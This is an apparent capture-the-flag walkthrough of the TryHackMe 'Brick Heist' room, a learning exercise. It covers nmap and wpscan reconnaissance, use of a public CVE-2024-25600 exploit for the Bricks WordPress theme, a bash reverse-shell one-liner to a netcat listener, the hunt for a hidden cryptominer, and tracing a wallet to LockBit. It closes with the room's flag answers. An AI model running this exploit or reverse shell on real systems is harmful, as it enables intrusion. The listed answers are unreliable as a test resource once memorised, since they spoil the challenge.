### Brick Heist
---

**Given Basic Info:**
Brick.By.Brick.v.2.1
Machine ID: **10.10.3.78 bricks.thm**
*Added to /etc/hosts*

---
#### Process

I started with nmap just so I can see which services and/or ports are available

nmap -nP -sV -sC 10.10.3.78

I wont paste the whole result because of -sC but:

Nmap scan report for 10.10.3.78
Host is up (0.16s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Python http.server 3.5 - 3.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

443 it's open so 10.10.3.78:443 or https://bricks.thm
The logo at the top of the web indicates wordpress.

Since it's wordpress, I'll try **wpscan** with --url attribute prompt

Didnt work.

the output saying "Scan Aborted: The url supplied 'https://bricks.thm/' seems to be down (SSL peer certificate or SSH remote key was not OK)" led me trying **--disable-tls-checks**

It's confirmed it WordPress 6.5. Detected entries:

/wp-admin/ 
/wp-admin/admin-ajax.php

So I looked into them aaand there's the wp login page.

Found out that *The most common reasons WordPress websites get hacked are vulnerabilities in plugins and themes and compromised WordPress admin accounts.*

So I looked at that info with Wappalyzer, it says the theme is bricks, the wpscan with --disable-tls-checks shows the bricks version as 1.9.5

I found an exploit of that theme in github **https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/tree/main** so i cloned it and exec.

Just to end up receiving me the new the PEP 668 error about forcing the usage of virtual environments in order to prevent conflicts and inconsistencies between packages managed by the OS and those managed by pip.

So yes, I needed to do that whole thing. (venv)

Installed the required dependencies one by one (in total 5 or 6)

executed the exploit CVE-2024-25600.py

gained access and looking at the files theres the .txt file which the flag **(Question 1 done)**

When trying to do a systemctl it closed and had to execute the CVE over again.

Decided  to do a reverse shell to scale privileges, tbh I didnt know how to do it. I found out that in the local machine I had to enable a listener port so **netcat -l -p 1234**

in the target machine I found the command which is "bash -c 'exec bash -i &>/dev/tcp/10.8.125.95/1234 <&1" (/dev/tcp/LOCAL_IP/PORT)

Doing that I could get the command shell

Systemctl | grep running

There was a service called ubuntu.service **(Question 3 done)** with "TRYHACK3M" description

systemctl cat ubuntu.service 

it's initialized by ExecStart=/lib/NetworkManager/**nm-inet-dialog** **(Question 2 done)**

Searching that place there's two files matching names: nm-inet-dialog and inet.conf

both of them were too long so I used command **head** 

nm-inet-dialog is not readable
inet.conf it's somewhat a miner log with the ID: **(Question 4 done)** 757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d

To be honest I didnt know what was that, after searching about a possible explanation, I had to decode. There's a cool tool I found called cyberchef "https://gchq.github.io/CyberChef/" and there's the option of trying to decode in several ways a code with "magic" option.

This is the output

bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa

seems it's repeated but the one I need is the first one 

bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa **(Question 5 done)**

I searched for that adress at https://www.blockchain.com/explorer

a wallet bc1qy-l67qa has been found. After searching each transaction number in google, there's one with importance because of a Office of Foreign Assets Control sanction: **bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r** owned by *"KONDRATIEV, Ivan Gennadievich"*. Searching that name in google there's a referenced group called "LockBit" **(Question 6 Done)**

And that's it.

#### Questions

1. What is the content of the hidden .txt file in the web folder?
THM{fl46_650c844110baced87e1606453b93f22a}

2. What is the name of the suspicious process?
nm-inet-dialog

3. What is the service name affiliated with the suspicious process?
ubuntu.service

4. What is the log file name of the miner instance?
inet.conf

5. What is the wallet address of the miner instance?
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

6. The wallet address used has been involved in transactions between wallets belonging to which threat group?
LockBit